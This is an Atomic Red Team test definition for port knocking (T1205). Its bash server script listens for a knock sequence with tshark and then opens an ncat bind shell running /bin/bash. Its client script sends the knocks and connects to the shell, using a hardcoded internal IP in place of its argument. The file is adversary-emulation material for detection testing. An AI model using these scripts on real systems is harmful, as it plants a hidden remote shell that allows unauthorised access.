---
attack_technique: T1205
display_name: Port Knocking

atomic_tests:
- name: Bind Shell After Sequence of Port Knocks - Server
  description: |
    Listen for a sequence of packets on specific ports for a specific protocol.  After the the sequence is received, create bind shell on a new listening port.

    Note: This may be used in conjunction with the client.
  supported_platforms:
    - linux
  input_arguments:
    knock_protocol:
      description: Protocol for knock - tcp or udp
      type: String
      default: "udp"
    knock_port_sequence:
      description: CSV of UDP ports that define a knock
      type: String
      default: "40000,41000,40000,42000,40000,43000"
    server_listening_port:
      description: Port to start listening on after knock
      type: String
      default: "54321"
    max_listen_seconds:
      description: Maximum number of seconds to listen for sequence before stopping and to listen on opened port
      type: String
      default: "300"
  dependencies:
  - description: |
      tshark must be installed  (Terminal Wireshark - https://www.wireshark.org/)
    prereq_command: |
      which tshark
    get_prereq_command: |
      Install tshark (Terminal Wireshark - https://www.wireshark.org/)
  - description: |
      ncat must be installed
    prereq_command: |
      which ncat && ncat --version
    get_prereq_command: |
      Install ncat
  executor:
    name: bash
    elevation_required: false
    command: |
      /bin/bash --login << 'EOF'
      # Bind shell server for T1205 of Atomic Red Team - https://github.com/redcanaryco/atomic-red-team

      ### Functions
      #################################################
      function startup() {
        sudo pkill tshar
        sudo pkill ncat
      }

      function debug () {
        if [[ -f "/tmp/.t1205.debug" ]] ; then
          echo $1 >&2
        fi
      }

      function someone_knocked() {
        local knock_protocol="$1"
        local knock_port_sequence="$2"
        local max_listen_seconds="$3"
        local tshark_filter=""
        local grep_pattern=""
        local -i counter=0

        if [ "$knock_protocol" = "tcp" ] ; then
          local tshark_protocl="tcp"
        else
          local tshark_protocl="udp"
        fi

        # Build tshark filter
        for knock_port in $(echo "${knock_port_sequence}" | tr "," "\n" | sort | uniq | tr "\n" " ") ; do
          if [ -z "${tshark_filter}" ] ; then
            tshark_filter="(${tshark_protocl} dst port ${knock_port})"
          else
            tshark_filter="${tshark_filter} or (${tshark_protocl} dst port ${knock_port})"
          fi
        done
        tshark_filter="(${tshark_filter}) and inbound"
        debug "TSHARK_FILTER: ${tshark_filter}"

        # Build grep of tshark output
        for knock_port in $(echo "${knock_port_sequence}" | tr "," " ") ; do
          if [ -z "${grep_pattern}" ] ; then
            grep_pattern="'${knock_port}'"
          else
            grep_pattern="${grep_pattern}(.*\n)*'${knock_port}'"
          fi
        done
        debug "GREP_PATTERN: ${grep_pattern}"

        debug "Listen for sequence for ${max_listen_seconds} seconds"
        sudo tshark -Q -l -n -T fields -E quote=s -e ${tshark_protocl}.dstport -a duration:${max_listen_seconds} "${tshark_filter}" > /tmp/t1205_server.dat  2> /dev/null &

        while [[ ${counter} -lt ${max_listen_seconds} ]] ; do
          grep -qPoz  "${grep_pattern}" /tmp/t1205_server.dat 2>&1 /dev/null
          if [ $? -eq 0 ] ; then
            debug "Sequence found!!!"
            sudo pkill tshark
            sleep 1s
            echo 0
            return 0
          fi
          debug "We have been listening for ${counter} seconds out of max ${max_listen_seconds} seconds"
          (( counter += 1 ))
          sleep 1s
        done
        echo 1
        return 1
      }

      function open_bind_server () {
        local max_listen_seconds=$1
        local listening_port=$2
        timeout ${max_listen_seconds}s ncat -nlp ${listening_port} -e /bin/bash
      }

      ### Main
      #################################################
      function main () {
        # Arguments
        readonly KNOCK_PROTOCOL="#{knock_protocol}"
        readonly KNOCK_PORT_SEQUENCE="#{knock_port_sequence}"
        readonly SERVER_LISTENING_PORT="#{server_listening_port}"
        readonly MAX_LISTEN_SECONDS="#{max_listen_seconds}"

        startup

        if [[ $(someone_knocked $KNOCK_PROTOCOL $KNOCK_PORT_SEQUENCE $MAX_LISTEN_SECONDS) -eq 0 ]] ; then
          debug "Start shell server; listen for up to ${MAX_LISTEN_SECONDS} seconds."
          open_bind_server "${MAX_LISTEN_SECONDS}" "${SERVER_LISTENING_PORT}"
          exit 0
        else
          debug "Knock sequence never heard..."
          exit 1
        fi
      }

      main "$@"
      EOF
    cleanup_command:
      rm -f /tmp/t1205_server.dat

- name: Bind Shell After Sequence of Port Knocks - Client
  description: |
    Send a sequence of packets on specific ports for a specific protocol.  After the the sequence is send, attempt to connect to a bind shell on a new listening port.

    Note: This may be used in conjunction with the server.
  supported_platforms:
    - linux
  input_arguments:
    server_ip:
      description: IP of server to knock
      type: String
      default: "compromised-host"
    knock_protocol:
      description: Protocol for knock - tcp or udp
      type: String
      default: "udp"
    knock_port_sequence:
      description: CSV of UDP ports that define a knock
      type: String
      default: "40000,41000,40000,42000,40000,43000"
    listening_port:
      description: Port the server will listen on after knock
      type: String
      default: "54321"
  dependencies:
  - description: |
      ncat must be installed
    prereq_command: |
      which ncat && ncat --version
    get_prereq_command: |
      Install ncat (netcat)
  executor:
    name: bash
    elevation_required: false
    command: |
      /bin/bash --login << 'EOF'
      # Bind shell client for T1205 of Atomic Red Team - https://github.com/redcanaryco/atomic-red-team

      ### Functions
      #################################################
      function startup() {
        sudo pkill tshar
        sudo pkill ncat
      }

      function debug () {
        if [[ -f "/tmp/.t1205.debug" ]] ; then
          echo $1 >&2
        fi
      }

      function knock_knock() {
        local server_ip=$1
        local knock_protocol=$2
        local knock_port_sequence=$3

        for PORT in $(echo "${KNOCK_PORT_SEQUENCE}" | tr "," " ") ; do
          if [[ "${knock_protocol}" = "udp" ]] ; then
            echo "Knock" | ncat -u -w 1s "${server_ip}" "$PORT" 2> /dev/null
          else
            echo "Knock" | ncat -w 1s "${server_ip}" "$PORT" 2> /dev/null
          fi
          debug "Knock $PORT"
          sleep 0.5s
        done
        debug "Knocks sent..."
      }

      function connect_to_shell () {
        local server_ip=$1
        local listening_port=$2

        #echo "echo Shell to host $HOSTNAME as user $USER successful.$(sleep 1)" | ncat ${server_ip} ${listening_port} > /tmp/t1205_client.dat
        # sleep 3
        # echo "./shell_server_echo.sh" | ncat ${server_ip} ${listening_port} 1> /tmp/t1205_client.dat 2> /dev/null
        cat <(echo 'echo Shell to host $HOSTNAME as user $USER successful') <(sleep 1) | nc "10.20.1.102" "54321" 1> /tmp/t1205_client.dat 2> /dev/null
        if [[ -s /tmp/t1205_client.dat ]] ; then
          debug "Shell was contacted!"
          echo 0
          return 0
        else
          debug "Shell not there yet..."
          echo 1
          return 1
        fi
      }

      ### Main
      #################################################
      function main () {
        # Arguments
        readonly SERVER_IP="#{server_ip}"
        readonly KNOCK_PROTOCOL="#{knock_protocol}"
        readonly KNOCK_PORT_SEQUENCE="#{knock_port_sequence}"
        readonly SERVER_LISTENING_PORT="#{listening_port}"

        startup

        declare SHELL_CONTACTED=0
        for LOOP in {1..5} ; do
          debug "Try knocking... ($LOOP of max 5)"
          knock_knock $SERVER_IP $KNOCK_PROTOCOL $KNOCK_PORT_SEQUENCE
          debug "Anyone home?  Knock $LOOP of max 5."

          sleep 2s
          if [[ $(connect_to_shell $SERVER_IP $SERVER_LISTENING_PORT) -eq 0 ]] ; then
            debug "Shell successfully executed with port knock"
            cat /tmp/t1205_client.dat
            exit 0
          fi
        done

        debug "Unable to bind shell after knocking multiple times"
        cat /tmp/t1205_client.dat
        exit 1
      }

      main "$@"
      EOF
    cleanup_command:
      rm -f /tmp/t1205_client.dat